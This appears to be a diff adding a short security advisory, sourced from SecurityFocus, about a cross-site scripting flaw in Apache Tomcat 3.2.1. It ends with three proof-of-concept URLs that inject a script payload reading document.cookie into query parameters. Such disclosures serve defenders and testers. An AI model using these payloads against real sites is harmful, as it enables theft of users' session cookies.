@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/37149/info
+
+Apache Tomcat is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Tomcat 3.2.1 is affected; other versions may also be vulnerable.
+
+http://www.example.com/?offset=1&cid=1&limit=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/?offset=1&cid=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/?offset=%3Cscript%3Ealert(document.cookie)%3C/script%3E&cid=1
